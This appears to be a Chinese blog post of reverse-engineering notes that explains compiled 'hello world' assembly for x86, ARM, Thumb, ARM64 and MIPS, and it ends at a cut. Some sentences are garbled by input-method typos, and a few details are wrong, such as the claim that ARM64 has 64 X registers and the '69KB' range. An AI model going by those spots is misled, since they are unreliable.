<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f1			proc near</span><br><span class="line"></span><br><span class="line">s			= dword ptr -1Ch</span><br><span class="line">			</span><br><span class="line">			sub esp,1Ch</span><br><span class="line">			mov [esp+1Ch+s],offset s		;&quot;world\n&quot;</span><br><span class="line">			call _puts</span><br><span class="line">			add esp,1Ch</span><br><span class="line">			retn</span><br><span class="line">f1			endp</span><br><span class="line"></span><br><span class="line">f2			proc near</span><br><span class="line"></span><br><span class="line">s			= dword ptr -1Ch</span><br><span class="line">			sub esp,1Ch</span><br><span class="line">			mov [esp+1Ch+s],offset aHello		;&quot;hello&quot;</span><br><span class="line">			call _puts</span><br><span class="line">			retn</span><br><span class="line">f2			endp</span><br><span class="line"></span><br><span class="line">aHello		db &#x27;hello&#x27;</span><br><span class="line">s				db &#x27;world&#x27;, 0xa, 0</span><br></pre></td></tr></table></figure>
<p>在打印字符串”hello world”的时候，这两个词的指针地址实际上是前后相邻的。在调用puts()函数进行输出时，函数本身不知道它所输出的字符串分为两个部分。实际上我们在汇编指令清单中可以看到，这两个字符串没有被 <strong>切实</strong> 分开。<br>在f1()函数调用puts()函数时，它输出字符串“world”和外加结束符（数值为零的1个字节），因为puts()函数并不知道字符串可以和前面的字符连起来形成新的字符串。<br>GCC编译器会使用这种技术充分节省内存。</p>
<h3 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h3><p>ARM 程序使用<code>R0</code>寄存器传递函数返回值。<br>ARM 程序使用<code>LR</code>寄存器(Link Register)存储函数结束之后的返回地址(RA&#x2F; Return Address)。x86 程序使用“栈”结构存储上述返回地址。<br><code>BX LR</code>指令的作用是跳转到返回地址，即返回到调用者函 数，然后继续执行调用体 caller 的后续指令。</p>
<h4 id="Keil-6-x2F-2013——未启用优化功能的ARM模式"><a href="#Keil-6-x2F-2013——未启用优化功能的ARM模式" class="headerlink" title="Keil 6&#x2F;2013——未启用优化功能的ARM模式"></a>Keil 6&#x2F;2013——未启用优化功能的ARM模式</h4><p>可使用下面的命令，用Keil编译器把hello world程序编译为ARM指令集架构的汇编程序：<br><code>armcc.exe --arm --c90 -O0 1.c</code><br>虽然armcc编译器生成的汇编指令清单同样采用了Intel语体，但是程序所使用的宏却很有ARM处理器的特色。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000	 					main</span><br><span class="line">.text:00000000	10 40 2D E9	STMFD SP!,&#123;R4,LR&#125;</span><br><span class="line">.text:00000004	1E 0E 8F E2	ADR R0,aHelloWorld	;&quot;hello world&quot;</span><br><span class="line">.text:00000008	15 19 00 EB	BL __2printf</span><br><span class="line">.text:0000000C	00 00 A0 E3	MOV R0,#0</span><br><span class="line">.text:00000010	10 80 BD E8	LDMFD SP!,&#123;R4,PC&#125;</span><br><span class="line"></span><br><span class="line">.text:000001EC	68 65 6C 6C	+aHelloWorld DCB &quot;hello, world&quot;,0	;DATA XREF:main+4</span><br></pre></td></tr></table></figure>
<p>可以看到，每条指令都占用4个字节，即ARM模式指令集。</p>
<p>第一句<code>STMFD SP!,&#123;R4,LR&#125;</code>相当于x86的<code>PUSH</code>指令。它把R4寄存器和LR（Link Register）寄存器的数值放到数据栈中。注意是<code>相当于</code>，而非<code>完全是</code>。这是因为ARM模式的指令集里没有PUSH指令，只有Thumb模式里的指令集才有<code>PUSH/POP</code>指令。<br>这条指令首先将SP递减，在栈中分配一个新的空间以便存储R4和LR的值。<br>STMFD指令能够一次存储多个寄存器的值，Thumb模式的PUSH指令也可以这样使用。实际上x86指令集中并没有这样方便的指令。STMFD指令可看作是增强版的PUSH指令，它不仅能够存储SP的值，也能够存储任何寄存器的值。换句话说，STMFD可用来在指定的内存空间存储多个寄存器的值。</p>
<p>接下来的指令<code>ADR R0,aHelloWorld</code>。它首先对PC进行取值操作，然后把”hello, world”字符串的偏移量与PC的值相加，将其结果存储到R0之中。<br>PC寄存器的作用是：编译器通常帮助PC把某些指令强制变为<code>位置无关代码/position-independent code</code>。在多数操作系统把程序加载在内存里的时候，OS分配给程序代码的内存地址是不固定的；但是程序内部既定指令和数据常量之间的偏移量是固定的（由二进制文件决定）。这种情况下，要在程序内部进行指令寻址（如跳转），就需要借助PC指针。ADR将当前指令的地址与字符串指针地址的减值（偏移量）传递给R0，程序借助PC指针可找到字符串指针的偏移地址，从而使操作系统确定字符串常量在内存里的绝对地址。</p>
<p><code>BL __2printf</code>调用printf()函数。BL实施的具体操作实际上是：</p>
<ol>
<li>将下一条指令的地址，即地址0x以处<code>MOV R0,#0</code>的地址，写入LR寄存器。</li>
<li>然后将printf()函数的地址写入PC寄存器，以引导系统执行该函数。</li>
</ol>
<p>当printf()完成工作之后，计算机必须知道返回地址，即它应当从哪里开始继续执行下一条指令。所以，每次使用BL指令调用其他函数之前，都要把BL指令的下一个指令的地址存储到LR寄存器。<br>这便是CISC（复杂指令集）处理器与RISC（精简指令集）处理器在工作模式上的区别。在拥有复杂指令集的x86体系里，操作系统可以利用栈存储返回地址。<br>另外，ARM模式跳转指令的寻址能力确实存在局限性。单条ARM模式的指令必须是32位&#x2F;4字节，所以BL指令无法调用32位绝对地址或32位相对地址（容纳不下），它只能编入24位的偏移量。不过既然每条指令的OPCODE必须是4字节，则指令地址必须在4n处，即偏移地址的最后两位必定为零，可在OPCODE里省略。在处理ARM模式的转移指令时，处理器的将指令中的OPCODE的低24位向左移2位，形成26位偏移量，再进行跳转。由此可知，转移指令B&#x2F;BL的跳转指令的目标地址，大约在当前位置的±32MB区间内。</p>
<p>下一条指令<code>MOV R0,#0</code>将R0寄存器置零。Hello World的C代码中，主函数返回零。该指令把返回值写在R0寄存器中。</p>
<p>最后到了<code>LDMFD SP!,&#123;R4,PC&#125;</code>这一条指令。它与STMFD成对出现，做的工作相反。它将栈中的数值取出，依次赋值给R4和PC，并且会调整栈指针SP。可以说这条指令与POP指令很相似。main()函数的第一条指令就是STMDF指令，它将R4寄存器和LR寄存器存储在栈中。main()函数结尾处使用LDMFD指令，其作用是把栈里存储的PC的值和R4寄存器的值恢复回来。<br>前面提到过，程序在调用其他函数之前，必须把返回地址保存在LR寄存器里。因为在调用printf()函数之后LR寄存器的值会发生改变，所以主函数的第一条指令就要负责保存LR寄存器里的值。在被调用的函数结束后，LR寄存器中存储的值会被赋值给PC，以便程序返回调用者函数继续运行。当C&#x2F;C++的主函数main()结束之后，程序的控制权权将返回给OS loader，或者CRT中的某个指针，或者作用相似的其他地址。</p>
<p>数据段中的DCB是汇编语言中定义ASCII字符数组&#x2F;字节数组的指令，相当于x86汇编中的DB指令。</p>
<h4 id="Thumb模式下、未开启优化选项的Keil"><a href="#Thumb模式下、未开启优化选项的Keil" class="headerlink" title="Thumb模式下、未开启优化选项的Keil"></a>Thumb模式下、未开启优化选项的Keil</h4><p>以Thumb模式编译前面的源代码：<br><code>armcc --thumb --c90 -O0 1.c</code><br>会得到如下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000	 					main</span><br><span class="line">.text:00000000	10 B5			PUSH &#123;R4,LR&#125;</span><br><span class="line">.text:00000004	C0 A0			ADR R0,aHelloWorld	;&quot;hello world&quot;</span><br><span class="line">.text:00000008	06 F0 2E F9	BL __2printf</span><br><span class="line">.text:0000000C	00 20			MOVS R0,#0</span><br><span class="line">.text:00000010	10 BD			POP SP!,&#123;R4,PC&#125;</span><br><span class="line"></span><br><span class="line">.text:000001EC	68 65 6C 6C	+aHelloWorld DCB &quot;hello, world&quot;,0	;DATA XREF:main+4</span><br></pre></td></tr></table></figure>
<p>Thumb模式下的每条指令，都对应着2个字节&#x2F;16位的OPCODE，这是Thumb模式的程序的特征。但是，Thumb模式的跳转指令BL<code>似乎</code>占用了4个字节的OPCODE，实际上它是由2条指令组成的。单条16位的OPCODE传递的信息太有限，不足以向被调用函数传递PC和偏移量信息。所以，上面的BL指令分为2条16位OPCODE。第一条16位指令可以华北偏移量的高10位，第二条指令可以传递偏移量的低11位。而Thumn模式的OPCODE都是固定的2个字节长，目标地址位最后一个位必定是0（Thumb模式的OPCODE的房奴地址从头再来必须是2n），因而会被省略。在执行Thunm模式的转移指令时，处理器会将目标地址左移1位，弄成2位的偏移量。即Thumb的BL跳转指令将无法跳到奇数地址，而且跳转指令仅仅能偏移到当前地址±2MB（22位有符号整数的取值区间）附近的范围之内。<br>程序主函数的其他指令，PUSH和POP工作方式与STMFD&#x2F;LDMFD相似。虽然表面上看不出来，但是实际上它们也会调整SP指针，ADR指令与前文的作用相同。而MOVS指令负责把返回值（R0寄存器）置零。</p>
<h4 id="ARM模式下、开启优化选项的Xcode"><a href="#ARM模式下、开启优化选项的Xcode" class="headerlink" title="ARM模式下、开启优化选项的Xcode"></a>ARM模式下、开启优化选项的Xcode</h4><p>由于Xcode 4.6.3 在不启用优先选项的时候会产生大量冗余代码，所以我们开启优化（-O3）让其生成最优的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__text:000028C4				_helloworld	</span><br><span class="line">__text:000028C4	80 40 2D E9		STMFD	SP!, &#123;R7, LR&#125;</span><br><span class="line">__text:000028C8	86 06 01 E3		MOV	R0, #0x1686</span><br><span class="line">__text:000028CC	0D 70 A0 E1		MOV	R7, SP</span><br><span class="line">__text:000028D0	00 00 40 E3		MOVT	R0, #0</span><br><span class="line">__text:000028D4	00 00 8F E0		ADD		R0, PC, R0</span><br><span class="line">__text:000028D8	C3 05 00 EB		BL		_puts</span><br><span class="line">__text:000028DC	00 00 A0 E3		MOV		R0, #0</span><br><span class="line">__text:000028E0	80 80 BD E8		LDMFD	SP!, &#123;R7, PC&#125;</span><br><span class="line">	</span><br><span class="line"> __cstring:00003F	62 48 65 6C		6C+aHelloWorld_0 DCB &quot;Hello World!&quot;, 0</span><br></pre></td></tr></table></figure>
<p>STMFD&#x2F;LDMFD不再重复。<br>第一个MOV指令将字符串“hello world”的偏移量（0x1686）赋值到R0寄存器。<br>根据Apple ABI函数接口规范，R7寄存器担当<code>帧指针（frame pointer）</code>寄存器。</p>
<p><code>MOVT R0,#0</code>将0写入R0寄存器的<code>高16位地址</code>。的ARM模式里，常规的MOV指令只能操作寄存器的低16位地址，而单条ARM指令最多是32位&#x2F;4字节。当然，寄存器之间传递数据没有这种限制。所以，对寄存器的高位（第16位到第31位）进行赋值操作的MOVT指令应运而生。然而此处的这条MOVT指令可有可无，因为在执行下一条指令<code>MOV R0,#0x1686</code>时，R0寄存器的高16位本来就会被清零。这也许是编译器智能方面的缺陷。</p>
<p><code>ADD R0,PC,R0</code>将PC和R0进行求和，计算得出字符串的绝对地址。回想前面的<code>位置无关代码</code>，我们知道程序运行之后的起始地址并不固定，此处，程序对这个地址进行了必要的修正。</p>
<p>然后，程序通过BL指令调用puts()函数，而没有像前面那样调用printf()函数，这是因为printf()函数与puts()函数作用基本相同，在不涉及控制符的情况下，puts()函数运行速度更快。</p>
<h4 id="Thumb-2-模式下、开启优化选项的Xcode（LLVM）"><a href="#Thumb-2-模式下、开启优化选项的Xcode（LLVM）" class="headerlink" title="Thumb-2 模式下、开启优化选项的Xcode（LLVM）"></a>Thumb-2 模式下、开启优化选项的Xcode（LLVM）</h4><p>默认情况下，Xcode 4.6.3会启用优化模式，并以Thumb-2模式编译源程序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__text:00002B6C						_hello_world</span><br><span class="line">__text:00002B6C	80 B5		 PUSH		&#123;R7,LR&#125;</span><br><span class="line">__text:00002B6E	41 F2 D8 30	MOVW		R0, #0x13D8</span><br><span class="line">__text:00002B72	6F 46		 MOV			R7, SP</span><br><span class="line">__text:00002B74	C0 F2 00 00	MOVT.W		R0, #0</span><br><span class="line">__text:00002B78	78 44		 ADD			R0, PC</span><br><span class="line">__text:00002B7A	01 F0 38 EA	BLX			_puts</span><br><span class="line">__text:00002B7E	00 20		 MOVS		R0, #0</span><br><span class="line">__text:00002B80	80 BD		 POP			&#123;R7, PC&#125;</span><br><span class="line">...</span><br><span class="line">__cstring:00003E70	48 65 6C	6F 20+aHelloWorld	DCB &quot;Hello word!&quot;,0xA,0</span><br></pre></td></tr></table></figure>
<p>前面提到过，thumb模式的BLX和BL指令以2个16位指令的形式成对出现。在Thumb-2模式下，BL和BLX指令对应的伪CPCODE有明显的32位指令特征，其对应的OPCODE都以<code>0xFX</code>或者<code>0xEx</code>开头。</p>
<p>在显示Thumb和Thumb-2模式程序的OPCODE时，IDA会以两个字节为单位对调。<br>在显示ARM模式的指令时，IDA以字节为单位、依次逆序显示其OPCODE。这是字节序的排版差异。<br>简要地说，在IDA显示ARM平台指令时，其显示顺序为：</p>
<ol>
<li>ARM及ARM64模式的指令，OPCODE以<code>4-3-2-1</code>的顺序显示。</li>
<li>Thumb模式的指令，OPCODE以<code>2-1</code>的顺序显示。</li>
<li>Thumb-2模式的16位指令，其OPCODE以<code>2-1-4-3</code>的顺序显示。<br>  在IDA中，我们可看到MOVW&#x2F;MOVT.W&#x2F;BLX指令都是以<code>0xFx</code>开头。</li>
</ol>
<p><code>MOVW R0,#0x13D8</code>将立即数写到R0寄存器的低16位地址，同时清除寄存器的高16位。</p>
<p><code>MOVT.W R0,#0</code>的作用与前面一个例子中Thumb模式的MOVT的作用相同，只不过此处是Thumb-2的指令。</p>
<p>在这两个例子中，最显著的区别是Thumb-2模式<code>BLX</code>指令。此处的BLX与Thumb模式的BL指令有着根本的区别。它不仅将puts()函数的返回地址RA存入了LR寄存器，将控制权交给了puts()函数，而且还把处理器从Thumb&#x2F;Thumb-2模式调整为ARM模式；它同时也负责在函数退出时把处理器的运行模式进行还原。总之，它同时实现了模式转换和控制权交接的功能，相当于执行了下面的ARM模式的指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__symbolstub1:00003FEC						_puts	 ; CODE XREF: _hello_world+E </span><br><span class="line">__symbolstub1:00003FEC	44 F0 9F E5	LDR PC, =__imp__puts</span><br></pre></td></tr></table></figure>
<p>有些同学可能会问，此处为什么不直接调用puts()函数？<br>直接调用的空间开销更大。<br>几乎所有的程序都会用到动态链接库，详细说来Windows的程序基本上都会用到DLL文件、Linux程序差不多都会用到.SO文件、MacOSX系统的程序多数也会用到.dylib文件。常用的库函数通常都放在动态链接库里，本例用到的标准C函数——puts()函数也不例外。</p>
<p>可执行的二进制文件（Windows的PE可执行文件，ELF或Mach-O）都有一个<code>输入表段（import section)</code>。输入表段声明了该程序需要通过模块加载的符号链接（函数名称和全局变量），并且含有外部模块的名称等信息。<br>在操作系统执行二进制文件的时候，它的加载程序（OS loader）会依据这个表段加载程序所需要的模块。在它加载该程序主模块的时候，对导入的符号链接进行枚举，逐一分配符号链接的地址。<br>在本例中，<code>_imp_puts</code>是操作系统加载程序为hello world程序提供的外部函数地址，属于32位变量。程序只需要使用LDR指令取出这个变量，并且将它赋值给PC寄存器，就可以调用puts()函数。<br>可见，一次性地给每个符号链接分配独立的内存地址，可以大幅度地减少OS loader在加载方面的耗时。<br>前面指出，如果只能靠单条指令、而不借助内存的读取操作，CPU就无法把32位的数值（指针或立即数）赋值给寄存器。所以，可以建立一个以ARM模式运行的独立函数，让它专门处理动态链接库的接口问题。此后Thumb模式的代码就可以跳转到这个处理接口功能的单指令专用函数，这种专用函数称为（运行模式的）<code>形实转换函数（thunk function）</code><br>前面有一个ARM模式的编译例子，它就使用BL指令实现相同功能的形实转换函数。但是那个程序使用的指令是BL而不是BLX，可见处理器并没有切换运行模式。</p>
<h5 id="形实转换函数（thunk-function）的由来"><a href="#形实转换函数（thunk-function）的由来" class="headerlink" title="形实转换函数（thunk function）的由来"></a>形实转换函数（thunk function）的由来</h5><p>形实转换函数，是<code>形参与实参互相转换的函数</code>的缩写。在编译过程中，为满足当时的过程（函数）调用约定，当形参为表达式时，编译器都会产生thunk，把返回值的地址传递给形参。<br>微软和IBM都对<code>thunk</code>一词有定义，将<code>从16位到32位</code>和<code>从32位到16位</code>的转变叫作“thunk”。</p>
<h3 id="ARM64"><a href="#ARM64" class="headerlink" title="ARM64"></a>ARM64</h3><h4 id="GCC-1"><a href="#GCC-1" class="headerlink" title="GCC"></a>GCC</h4><p>使用GCC 4.8.1 将上述代码编译为ARM64程序，可得到如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400590 &lt;main&gt;:</span><br><span class="line">	400590:		a9bf7bfd	stp	x29, x30, [sp,#-16]!</span><br><span class="line">	400594:		910003fd	mov	x29, sp</span><br><span class="line">	400598:		90000000	adrp	x0,400000 &lt;_init-0x3b8&gt;</span><br><span class="line">	40059c:		91192000	add	x0, x0, #0x648</span><br><span class="line">	4005a0:		97ffffa0	bl	400420 &lt;puts@plt&gt;</span><br><span class="line">	4005a4:		52800000	mov	w0, #0x0 // #0</span><br><span class="line">	4005a8:		a8c17bfd	ldp x29, x30, [sp],#16</span><br><span class="line">	4005ac:		d65f03c0	ret</span><br><span class="line">...</span><br><span class="line">Contents of section .rodata:</span><br><span class="line">400640 01000200 00000000 48656c6c 6f210000 ........Hello!..</span><br></pre></td></tr></table></figure>
<p>一方面，ARM64的CPU只可能运行于ARM模式、不可运行于Thumb或Thumb-2模式，所以它必须使用32位的指令；另一方面，64位平台的寄存器数量也翻了一翻，拥有了64个<code>X-</code>字头的寄存器。当然，程序还可以通过<code>W-</code>字头的名称直接访问寄存器的低32位空间。</p>
<p>上述程序的<code>STP(Store Pair)</code>指令把两个寄存器（即X29和X30）的值存储到栈里。虽然这个指令实际上可以把这对数值存储到内存中的做任意地址，但是由于该指令明确了SP寄存器，所以它就是通过栈来存储这对数值。ARM64平台的寄存器都是64位寄存器，每个寄存器可存储8字节数据，所以程序要分配16字节的空间来存储两个寄存器的值。<br>这条指令中的感叹号标志，意味着其标注的运算会被优先执行。即，该指令先把SP的值减去16，在此之后再把两个寄存器的值写在栈里。这属于<code>预索引（pre-index）</code>指令。此外还有<code>延迟索引（post-index）</code>指令与之对应。两者的区别，我们会在以后的章节中说明。<br>以更为易懂的x86指令来解读的话，这条指令相当于<code>PUSH X29</code>和<code>PUSH X30</code>两条指令。在ARM64平台上，X29寄存器是<code>帧指针FP</code>，X30起着<code>LR</code>的作用。所以这两个寄存器在函数的序言和尾声处成对出现。</p>
<p>第二条指令把 SP 的值复制给 X29，即 FP。这用来设置函数的栈帧。</p>
<p><code>ADRP</code> 和 <code>ADD</code> 指令相互配合，把“Hello!”字符串的指针传递给 X0 寄存器，继而充当函数参数传递给被调用函数。受到指令方面的限制，ARM 无法通过单条指令就把一个较大的立即数赋值给寄存器。所以，编译器要组合使用数条指令进行立即数赋值。第一条 ADRP 把 4KB 页面的 地址传递给 X0，而后第二条 ADD 进行加法运算并给出最终的指针地址。在以后的章节中我们会详细讨论。<br>0x400000 + 0x648 &#x3D; 0x400648。这个数是位于.rodata 数据段的 C 字符串“Hello!”的地址。</p>
<p>接下来，程序使用 <code>BL</code> 指令调用 puts()函数。</p>
<p><code>MOV</code> 指令用来给 W0 寄存器置零。W0 是 X0 寄存器的低 32 位。main()函数通过 X0 寄存器来传递函数返回值 0。</p>
<p>在此之后，<code>LDP (Load Pair)</code>指令还原 X29 和 X30 寄存器的值。此处的这条指令没有感叹号标记，这意 味着它将率先进行赋值操作，而后再把 SP 的值与 16 进行求和运算。这属于延时索引(post-index)指令。</p>
<p><code>RET</code>指令是 ARM64 平台的特色指令。虽然它的作用与 BX LR 相同，但是它实际上是按照寄存器的名 称进行跳转的(默认使用 X30 寄存器指向的地址)，通过底层指令提示 CPU 此处为函数的返回指令、不属 于普通转移指令的返回过程。RET 指令经过了面向硬件的优化处理，它的执行效率较高。</p>
<h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p>在 MIPS 指令里，寄存器有两种命名方式。一种是以数字命名(<code>$0~$31</code>)，另一种则是以伪名称(pseudoname)命名(<code>$V0~VA0</code>，依此类推)。在 GCC 编译器生成的汇编指令中，寄存器都采用数字方式命名。<br>存储函数返回值的寄存器都是<code>$2</code>(即<code>$V0</code>)。<br><code>LI</code>指令 是英文词组“Load Immediate(加载立即数)”的缩写。<br><code>J</code>和<code>JR</code>指令都属于跳转指令，它们把执行流递交给调用者函数，跳转到<code>$31</code>即$RA 寄存器中的地址。这个寄存器相当于的 ARM 平台的 LR 寄存器。<br><code>分支(转移)指令延迟槽 (Branch delay slot)</code>的现象。简单地说，不管分支(转移)发生与否，位于分支指 令后面的一条指令(在延时槽里的指令)，总是被先于分支指令提交。这是 RISC 精简指令集的一种特例， 我们不必在此处深究。总之，转移指令后面的这条赋值指令实际上是在转移指令之前运行的。</p>
<h4 id="全局指针-Global-Pointer"><a href="#全局指针-Global-Pointer" class="headerlink" title="全局指针 Global Pointer"></a>全局指针 Global Pointer</h4><p><code>全局指针</code>是 MIPS 软件系统的一个重要概念。们已经知道，每条 MIPS 指令都是 32 位的指令，所以 单条指令无法容纳 32 位地址(指针)。这种情况下 MIPS 就得传递一对指令才能使用一个完整的指针。<br>从另一方面来说，单条指令确实可以容纳一组由寄存器的符号、有符号的 16 位偏移量(有符号数)。 因此任何一条指令都可以构成的表达式，访问某个取值范围为“寄存器−32768”~“寄存器+32767”之 间的地址(总共 69KB)。为了简化静态数据的访问操作，MIPS 平台特地为此保留了一个专用的寄存器， 并且把常用数据分配到了一个大小为 64KB 的内存数据空间里。这种专用的寄存器就叫作“全局指针”寄存器。它的值是一个指针，指向 64KB(静态)数据空间的正中间。而这 64KB 空间通常用于存储全局变量，以及 printf()这类由外部导入的的外部函数地址。GCC 的开发团队认为:获取函数地址这类的操作，应 当由单条指令完成;双指令取址的运行效率不可接受。<br>在 ELF 格式的文件中，这个 64KB 的静态数据位于.sbss 和.sdata 之中。“.sbss”是 small BSS(Block Started by Symbol)的缩写，用于存储非初始化的数据。“.sdata”是 small data 的缩写，用于存储有初始化数值的数据。 根据这种数据布局编程人员可以自行决定把需要快速访问的数据放在.sdata、还是.sbss 数据段中。<br>有多年工作经验的人员可能会把全局指针和 MS-DOS 内存(参见本书第 49 章)、或者 MS-DOS 的 XMS&#x2F;EMS 内存管理器联系起来。这些内存管理方式都把数据的内存存储空间划分为数个 64KB 区间。<br>全局指针并不是 MIPS 平台的专有概念。至少 PowerPC 平台也使用了这一概念。</p>
<h4 id="Optimizing-GCC"><a href="#Optimizing-GCC" class="headerlink" title="Optimizing GCC"></a>Optimizing GCC</h4><h5 id="Optimizing-GCC-4-4-5-汇编输出"><a href="#Optimizing-GCC-4-4-5-汇编输出" class="headerlink" title="Optimizing GCC 4.4.5 汇编输出"></a>Optimizing GCC 4.4.5 汇编输出</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$LC0:</span><br><span class="line">; \000 is zero byte in octal base:</span><br><span class="line">		.ascii &quot;Hello, world!\012\000&quot;</span><br><span class="line">main:</span><br><span class="line">; function prologue</span><br><span class="line">;set tht GP:</span><br><span class="line">		lui 		$28,$hi(__gnu_local_gp)</span><br><span class="line">		addiu	$sp,$sp,-32</span><br><span class="line">		addiu $28,$28,%lo(__gnu_local_gp)</span><br><span class="line">; save the RA to the local stack:</span><br><span class="line">		sw $31,28($sp)</span><br><span class="line">; load the address of the puts() function from the GP to $25</span><br><span class="line">		lw		$25,%call6(puts)($28)</span><br><span class="line">; load the address of the text string to $4 ($a0):</span><br><span class="line">		lui		$4,$hi($LC0)</span><br><span class="line">; jump to puts(), saving the return address in the link register:</span><br><span class="line">		jalr		$25</span><br><span class="line">		addiu		$4,$4,%lo($LC0)		; branch delay slot</span><br><span class="line">; restore thr RA:</span><br><span class="line">		lw		$31,28($sp)</span><br><span class="line">; copy 0 from $zero to $v:</span><br><span class="line">		move $2,$0</span><br><span class="line">; return by jumping to the RA:</span><br><span class="line">		j		$31</span><br><span class="line">; function epilogue:</span><br><span class="line">		addiu $sp,$sp,32		; branch delay slot</span><br></pre></td></tr></table></figure>
<p>主函数序言启动部分的指令初始化了全局指针寄存器GP寄存器的值，并且把它指向 64KB数据段的正中央。<br>同时，程序把RA寄存器的值存储于本地数据栈。<br>它同样使用puts()函数替代了printf()函数。而puts()函数的地址， 则通过<code>LW(Load Word)</code>指令加载到了$25 寄存器。<br>此后，字符串的高 16 位地址和低 16 位地址分别由<code>LUI(Load Upper Immediate)</code>和<code>ADDIU(Add Immediate Unsigned Word)</code>两条指令加载到$4 寄存器。LUI中的Upper一词说明它将数据存 储于寄存器的高 16 位。与此相对应，ADDIU则把操作符地址处的低 16 位进行了求和运算。ADDIU指令位于JALR 指令之后，但是<code>会先于后者运行 </code>。$4 寄存器其实就是$A0 寄存器，在调用函数时传递第一个参数。<br><code>JALR (Jump and Link Register)</code>指令跳转到$25 寄存器中的地址，即 puts()函数的启动地址，并且把下一 条 LW 指令的地址存储于 RA 寄存器。<br>可见，MIPS 系统调用函数的方法与 ARM 系统相似。需要注意的是， 由于<code>分支延迟槽效应</code>，存储于 RA 寄存器的值并非是已经运行过的、“下一条”指令的地址，而是更后面那 条(延迟槽之后的)指令的地址。所以，在执行这条 JALR 指令的时候，写入 RA 寄存器的值是 PC+8，即 ADDIU 后面的那条 LW 指令的地址。<br>第 19 行的 <code>LW (Load Word)</code>指令，用于把本地栈中的 RA 值恢复回来。请注意，这条指令并不位于被调用函数的函数尾声。<br>第 22 行的<code>MOVE</code>指令把$0($ZERO)的值复制给$2($V0)。MIPS 有一个常量寄存器，它里面的值是常量 0。使用<code>$0</code> 寄存器提供数值0。另外一个值得注意的现象:在 MIPS 系统之中，没有在寄 存器之间复制数值的(硬件)指令。确切地说，<code>MOVE DST, SRC</code>是通过加法指令<code>ADD DST,SRC, $ZERO</code>变相实现的，即<code>DST=SRC+0</code>，这两种操作等效。由此可见，MIPS 研发人员希望尽可能地复用 opcode，从 而精简 opcode 的总数。然而这并不代表每次运行 MOVE 指令时 CPU 都会进行实际意义上的加法运算。CPU 能够对这类伪指令进行优化处理，在运行它们的时候并不会用到 ALU(Arithmetic logic unit)。<br>第 24 行的<code>J</code>指令会跳转到 RA 所指向的地址，完成从被调用函数返回调用者函数的操作。还是由于<code>分支延迟槽效应</code>，其后的ADDIU指令会先于J指令运行，构成函数尾声。</p>
<h5 id="Opimizing-GCC4-4-5-IDA"><a href="#Opimizing-GCC4-4-5-IDA" class="headerlink" title="Opimizing GCC4.4.5(IDA)"></a>Opimizing GCC4.4.5(IDA)</h5><p>再来看看 IDA 生成的指令清单，熟悉一下各寄存器的伪名称。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000  main:</span><br><span class="line">.text:00000000</span><br><span class="line">.text:00000000  var_10   = -0x10 </span><br><span class="line">.text:00000000  var_4    = -4</span><br><span class="line">.text:00000000</span><br><span class="line">; function prologue. </span><br><span class="line">; set the GP:</span><br><span class="line">.text:00000000  lui $gp, (__gnu_local_gp &gt;&gt; 16)</span><br><span class="line">.text:00000004  addiu $sp, -0x20</span><br><span class="line">.text:00000008 la  $gp, (__gnu_local_gp &amp; 0xFFFF)</span><br><span class="line">; save the RA to the local stack:</span><br><span class="line">.text:0000000C sw  $ra, 0x20+var_4($sp)</span><br><span class="line">; save the GP to the local stack:</span><br><span class="line">; for some reason, this instruction is missing in the GCC assembly output: </span><br><span class="line">.text:00000010 sw $gp, 0x20+var_10($sp)</span><br><span class="line">; load the address of the puts() function from the GP to $t9:</span><br><span class="line">.text:00000014 lw  $t9,(puts &amp; 0xFFFF)($gp)</span><br><span class="line">; form the address of the text string in $a0:</span><br><span class="line">.text:00000018 lui $a0, ($LC0 &gt;&gt; 16) # &quot;Hello, world!&quot; </span><br><span class="line">; jump to puts(), saving the return address in the link register:</span><br><span class="line">.text:0000001C jalr  $t9</span><br><span class="line">.text:00000020 la    $a0, ($LC0 &amp; 0xFFFF) # &quot;Hello, world!&quot;</span><br><span class="line">;restore the RA:</span><br><span class="line">.text:00000024 lw    $ra, 0x20+var_4($sp)</span><br><span class="line">; copy 0 from $zero to $v0:</span><br><span class="line">.text:00000028 move  $v0, $zero</span><br><span class="line">; return by jumping to the RA:</span><br><span class="line">.text:0000002C jr    $ra</span><br><span class="line">; function epilogue:</span><br><span class="line">.text:00000030 addiu $sp, 0x20</span><br></pre></td></tr></table></figure>
<p>程序中保存 puts()函数地址的寄存器叫作<code>$T9</code> 寄存器。这类 T-开头的寄存器叫作“临时”寄存器，用于保存代码里的临时值。调用者函数负责保存这些寄存器的数值(caller-saved)，因为它有可能会被被调用的函数重写。</p>
<h5 id="Non-pimizing-GCC-汇编输出"><a href="#Non-pimizing-GCC-汇编输出" class="headerlink" title="Non-pimizing GCC 汇编输出"></a>Non-pimizing GCC 汇编输出</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$LC0:</span><br><span class="line">		.ascii &quot;Hello, world!\012\000&quot;</span><br><span class="line">main:</span><br><span class="line">; function prologue</span><br><span class="line">; save the RA ($31) and FP in the stack:</span><br><span class="line">		addiu	$sp,$sp,-32</span><br><span class="line">		sw		$31,28($sp)</span><br><span class="line">		sw		$fp,24($sp)</span><br><span class="line">; set the FP (stack frame pointer):</span><br><span class="line">		move	$fp,$sp</span><br><span class="line">; set the GP:</span><br><span class="line">		lui		$28,%hi(__gnu_local_gp)</span><br><span class="line">		addiu	$28,$28,%lo(__gnu_local_gp)</span><br><span class="line">; load the address of the text string:</span><br><span class="line">		lui		$2,%hi($LC0)</span><br><span class="line">		addiu	$4,$2,%lo($LC0)</span><br><span class="line">; load the address of the puts() using GP:</span><br><span class="line">		lw		$2,%call16(puts)($28)</span><br><span class="line">		nop</span><br><span class="line">; call puts():</span><br><span class="line">		move	$25,$2</span><br><span class="line">		jalr		$25</span><br><span class="line">		nop					; branch delay slot</span><br><span class="line">; restore the GP from the 